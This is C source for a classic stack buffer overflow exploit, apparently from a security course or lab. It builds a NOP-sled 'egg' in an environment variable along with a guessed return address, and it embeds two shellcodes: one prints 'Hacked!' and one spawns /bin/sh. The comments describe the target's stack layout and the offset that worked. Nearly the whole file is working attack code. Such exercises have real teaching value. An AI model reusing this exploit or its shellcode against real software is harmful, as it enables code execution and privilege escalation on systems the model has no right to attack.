#include <stdlib.h>

#define DEFAULT_OFFSET 0
#define DEFAULT_BUFFER_SIZE 512
#define DEFAULT_EGG_SIZE 2048
#define NOP 0x90

char hacked_shellcode[] = "\xeb\x14"// jmp    8048076 <_start+0x16>
	"\x31\xc0"						// xor    %eax,%eax
	"\xb0\x04"						// mov    $0x4,%al
	"\x31\xdb"						// xor    %ebx,%ebx
	"\x43"							// inc    %ebx
	"\x59"							// pop    %ecx
	"\x31\xd2"						// xor    %edx,%edx
	"\xb2\x07"						// mov    $0x7,%dl
	"\xcd\x80"						// int    $0x80
	"\x31\xc0"						// xor    %eax,%eax
	"\xb0\x01"						// mov    $0x1,%al
	"\xcd\x80"						// int    $0x80
	"\xe8\xe7\xff\xff\xff"			// call   8048062 <_start+0x2>
	"Hacked!";

char short_shellcode[] = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07"
	"\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31"
	"\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";

unsigned long get_sp(void) {
	__asm__("mov %esp, %eax");
}

void main(int argc, char *argv[]) {
	/**
	   	buffer (in the vulnerable program) is 80 bytes,
		so the stack looks like this
		---------------------------------------------------------------------------
		| Buffer -   | int i - | Slack -  | EBP -   | RET -   | argc -  | argv -  |
		| 80 bytes   | 4 bytes | 8 bytes  | 4 bytes | 4 bytes | 4 bytes | 4 bytes |
		---------------------------------------------------------------------------
		We will replace the contents of the stack from buffer 
		and overwrite the return address so that it points to 
		the address of buffer.
		---------------------------------------------------
		| NOP -   | Shellcode - | NOP -   | PTR to EGG    |
		| X bytes | Y bytes     | Z bytes | env - 4 bytes |
		---------------------------------------------------
		X + Y + Z = 96 bytes
		Buff size = 100

		Worked:
		Buffer size: 600
		Offset: -4600 (Negative offset because env variable is set before stack is
		created by the exploitable program, which means env variable is at a higher
		memory address or is in the bottom of the stack when compared to the exploitable
		program)
	**/
	char *shellcode;
	long addr, sp;
	int offset = DEFAULT_OFFSET, bsize = DEFAULT_BUFFER_SIZE;
	int i, eggsize = DEFAULT_EGG_SIZE, choice = 1;
	if (argc > 1)
		bsize = atoi(argv[1]);
	if (argc > 2)
		offset = atoi(argv[2]);
	if (argc > 3)
		eggsize = atoi(argv[3]);
	if (argc > 4)
		choice = atoi(argv[4]);
	printf("Buffer size: %d, Offset: %d, Eggsize: %d, Choice: %d\n", bsize, offset, eggsize, choice);
	switch (choice) {
		case 1: 
			shellcode = malloc(sizeof(hacked_shellcode));
			shellcode = hacked_shellcode;
			break;
		default:
			shellcode = malloc(sizeof(short_shellcode));
			shellcode = short_shellcode;
	}
	char buff[bsize], egg[eggsize], *ptr;
	sp = get_sp();
	printf("Stack pointer: 0x%x\n", sp);
	addr = sp - offset; 
	printf("Using address: 0x%x\n", addr);
	ptr = buff;
	long *addr_ptr = (long *) ptr;
	// The limit is bsize/4 because addresses are fourbyte aligned on
	// 32 bit processors.
	for (i = 0; i < bsize/4; i++)
		*(addr_ptr + i) = (int) addr;
	memcpy(buff, "RET=", 4);
	memset(egg, NOP, sizeof(egg));
	memcpy(egg, "EGG=", 4);
	memcpy(egg + eggsize - 1 - strlen(shellcode), shellcode, strlen(shellcode));
	buff[bsize-1] = '\0';
	egg[eggsize-1] = '\0';
	putenv(egg);
	putenv(buff);
	system("/bin/sh");
}
